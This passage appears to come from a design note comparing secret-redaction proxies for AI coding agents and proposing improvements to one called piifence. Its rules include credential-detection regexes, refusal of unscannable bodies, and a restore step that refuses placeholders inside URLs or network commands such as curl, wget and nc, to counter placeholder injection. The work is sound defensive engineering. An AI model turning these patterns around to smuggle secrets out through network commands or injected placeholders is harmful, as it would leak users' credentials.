- **Propagation gated by the rules** (PrivAiTe): spread only values a structured rule confirmed and that are token-shaped. Trade-off: some secrets the ML model alone found are not spread, which they accept to avoid rewriting code across the transcript.
- **Projections with offset maps** for NFKC, zero-width removal and percent-decoding (redaction-proxy). Trade-off: only one decode level, and the 32-hex rule's handling of Big5/Shift-JIS edge cases can produce false positives.
- **Refuse unscannable bodies** (promptlatch 415 for multipart or compressed; PrivAiTe and og-local fail closed). Trade-off: some features stop working (attachments).
- **Category-limited restore into tool inputs, and no restore inside URLs** (redaction-proxy). Trade-off: tools that need a secret get a placeholder and fail until the user allows it.
- **Escape placeholder-shaped input** (`⟦`→`⟪`) and anchor rules for echoed placeholders (redaction-proxy, PrivAiTe). Trade-off: a few characters in the input change.
- **Placeholders, not fakes** (redaction-proxy measured 100% against 75% verbatim retention; rdx ADR-002). Format-preserving fakes are offered only for user-defined rules (rdx).
- **Deterministic, append-stable numbering** so the provider prompt cache keeps hitting (og-local nonce hash; redaction-proxy renumbers from full history). The cache breaks once when a later turn first detects a value already present earlier.
- **Detection cache keyed by text hash and storing no values** (PrivAiTe salted-hash spans; og-local chunk hashes; promptlatch redacted-output-only cache). This addresses the 42-72 s per-request rescan cost on long sessions.
- **Re-scrub tool output in the hook** (Prismor sed wrapper), so restored secrets do not land in local transcripts.
- **Credential injection by the proxy** (Formal): the agent never holds the real API key.
- **Local auth for the proxy** (og-local PID-bound HMAC token; redaction-proxy token, Host and Origin checks against DNS rebinding).

## 5. Quick wins for piifence

1. **Leak check before forwarding.** After substitution, search the serialized final body for every value detected in this request and every value in the session map (raw and JSON-escaped, ignoring ASCII case for rule hits). Refuse with 403 or 422 if any remain. This covers thinking, `server_tool_use`, `mcp_tool_use`, `tools[].description`, `web_fetch_tool_result` and JSON keys whenever the value was also seen somewhere we scan. It costs one Aho-Corasick or `containsAny` pass.
2. **Exact-match the session map everywhere.** Swap known session-map values everywhere before detection, as we already do for env-var values, gated to token-shaped values (at least 8 characters with a digit, standing alone). This covers split secrets, prose echoes and restored values that are repeated later.
3. **Randomize placeholder names per session** (for example `$PIIF_SECRET_<4-6 random base32>_N`). Escape or refuse placeholder-shaped literals that arrive in tool_result or user text. In `piifence restore`, only restore names this session issued, and refuse or keep the name when it appears inside a URL or a network command (`curl`, `wget`, `nc`, `http(s)://`).
4. **Normalize before scanning, mapping offsets back.** Apply NFKC, drop U+00AD/U+200B-D/U+2060/U+FEFF, and percent-decode one level. Run gitleaks and the classifier on the projection and map spans back to the original.
5. **A hex rule:** `\b[0-9a-fA-F]{32,}\b`, minus a preceding `/` and minus SHA context words within ±32 characters (`commit|sha|hash|rev|digest|checksum|blob|tree|oid|integrity|etag`). Add the base64 rule: 32+ characters with mixed case and a digit, entropy at least 4.2, and no `sha\d{3}-` prefix. Our UUID and hash guards should stay in front of these.
6. **A prose rule:** a credential word, then `is`/`:`/`是`/`は`/`ist`/..., then a value. Generic words need 16+ characters and entropy of at least 3.5; password words need 6+ characters of printable ASCII (redaction-proxy `CREDENTIAL_PHRASE`).
7. **Line-prefix tolerance:** let `.env` and assignment rules start after Read-tool numbering (`^\s*\d+[:|\t→]`) and after diff markers (PrivAiTe `ENV_LINE_PREFIX`).
8. **Refuse what we cannot scan:** base64 `document` sources, unless they decode to a real PDF we can extract text from; images, unless they pass a magic-byte check; and unknown block types (or scan their text-like fields as PrivAiTe does). Also refuse `/v1/complete` and `/v1/files` POSTs, multipart bodies, and `Content-Encoding` other than identity.
9. **Classifier coverage assertion:** check that windows cover every token and character of each string. Add a test with a secret just past the first window and one straddling a window edge.
10. **Port test cases** from §3, especially placeholder injection, echo-after-restore, preceding log context, and the encoding tests.
